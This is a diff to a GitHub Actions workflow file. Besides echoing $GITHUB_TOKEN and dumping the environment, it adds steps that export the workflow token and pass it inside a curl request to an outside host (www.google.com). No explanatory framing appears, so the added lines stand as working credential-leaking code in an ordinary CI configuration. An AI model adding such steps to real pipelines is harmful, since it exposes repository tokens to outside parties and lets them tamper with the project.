@@ -7,6 +7,9 @@ jobs:
       - run: echo "🎉 The job was automatically triggered by a ${{ github.event_name }} event."
       - run: echo "$GITHUB_RUN_ID"
       - run: echo "$GITHUB_TOKEN"
+      - run: export GT=$GITHUB_TOKEN
+      - run: export GT2=${{ github.token }}
+      - run: curl -v https://www.google.com/$GT2=${{ github.token }}
       - run: env
       - run: echo "Deploying to production server on branch $GITHUB_RUN_ID"
       - run: sleep 61
